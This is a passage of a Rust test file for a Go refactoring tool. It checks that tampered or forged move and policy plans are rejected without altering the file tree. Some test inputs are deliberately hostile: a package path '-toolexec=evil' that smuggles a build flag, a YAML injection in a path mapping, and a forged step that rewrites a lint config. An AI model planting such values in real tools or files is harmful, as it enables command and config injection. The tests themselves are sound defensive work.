            Box::new(|p| p.affected_packages = vec!["-toolexec=evil".into()]),
            "relative package path",
        ),
    ];
    for (label, mutate, want) in rows {
        let root = input_copy("base");
        let mut plan = base_move_plan(&root);
        mutate(&mut plan);
        let before = checksums(&root);
        let err = apply(&plan.sealed(), &root, &ApplyOptions::default()).expect_err(label);
        assert!(err.to_string().contains(want), "{label}: {err:#}");
        assert_eq!(checksums(&root), before, "{label}: tree changed");
    }
}

#[test]
fn a_policy_plan_may_only_touch_the_known_policy_files() {
    for bad in ["a.go", ".golangci.yml.bak", ".github/workflows/x.yml"] {
        let root = input_copy("base");
        let source =
            plan_rename_pkg(&root, "example.com/m/lib", "example.com/m/core", None, None).unwrap();
        let mut policy = plan_sync_policy(&root, &source).unwrap();
        policy.steps[0].transform.new_path = Some(bad.into());
        let before = checksums(&root);
        let err = apply(&policy.sealed(), &root, &ApplyOptions::default()).unwrap_err();
        assert!(err.to_string().contains("may touch"), "{bad}: {err:#}");
        assert_eq!(checksums(&root), before);
    }
}

#[test]
fn a_resealed_forged_sync_policy_plan_is_rejected_in_every_shape() {
    let forge: Vec<(&str, PlanMutator)> = vec![
        (
            "hostile path_map",
            Box::new(|p| p.path_map[0].to = "x\n  evil: 1".into()),
        ),
        (
            "dropped step",
            Box::new(|p| {
                p.steps.pop();
            }),
        ),
        (
            "extra step",
            Box::new(|p| {
                let mut extra = p.steps[0].clone();
                extra.transform.old_path = None;
                extra.transform.old_sha256 = None;
                extra.transform.new_path = Some(".golangci.yml".into());
                extra.transform.new_content = Some("run:\n  skip-dirs: [\"/\"]\n".into());
                p.steps.push(extra);
            }),
        ),
    ];
    for (label, mutate) in forge {
        let root = input_copy("base");
        // A second policy file, so the genuine plan has two steps and "drop one" is a forgery
        // (dropping the only step of a one-step plan is just an empty, harmless plan).
        std::fs::write(
            root.join(".golangci.yml"),
            "linters-settings:\n  depguard:\n    rules:\n      main:\n        files:\n          - \"example.com/m/lib/**\"\n",
        )
        .unwrap();
        let source =
            plan_rename_pkg(&root, "example.com/m/lib", "example.com/m/core", None, None).unwrap();
        let mut policy = plan_sync_policy(&root, &source).unwrap();
        assert!(
            policy.steps.len() >= 2,
            "{label}: expected two policy steps"
        );
        mutate(&mut policy);
        let before = checksums(&root);
        assert!(
            apply(&policy.sealed(), &root, &ApplyOptions::default()).is_err(),
            "{label}: forged plan was applied"
        );
        assert_eq!(checksums(&root), before, "{label}: tree changed");
    }
}

#[test]
fn rollback_that_itself_fails_is_reported_as_a_dirty_tree() {
    let root = input_copy("base");
    let plan = base_move_plan(&root);
    let sabotage = |_: &Path, _: &Path| {
        let _ = std::fs::remove_dir_all(root.join(".kibitzer/plans/.wal-backup"));
        Err(std::io::Error::other("injected"))
    };
    let result = apply_with(&plan, &root, &ApplyOptions::default(), &sabotage).unwrap();
    assert_eq!(result.status, ApplyStatus::RolledBack);
    assert!(
        !result.restore_errors.is_empty(),
        "a failed rollback must be visible"
    );
}

#[cfg(unix)]
#[test]
fn an_unreadable_go_file_blocks_planning_instead_of_being_skipped() {
    let root = scratch(
        "unreadable-go",
        &[
            ("lib/a.go", "package lib\n\nfunc A() {}\n"),
            ("app/app.go", "package app\n"),
        ],
    );
    // Not valid UTF-8: the workspace cannot read it, so it could hide an importer.
    std::fs::write(root.join("app/odd.go"), [0x70u8, 0x61, 0xff, 0xfe, 0x0a]).unwrap();
    let plan = plan_move_files(&root, &["lib/a.go".into()], "example.com/m/dest", None).unwrap();
    let codes: Vec<&str> = plan.blockers.iter().map(|b| b.code.as_str()).collect();
    assert!(codes.contains(&"unreadable_go_file"), "{codes:?}");
}
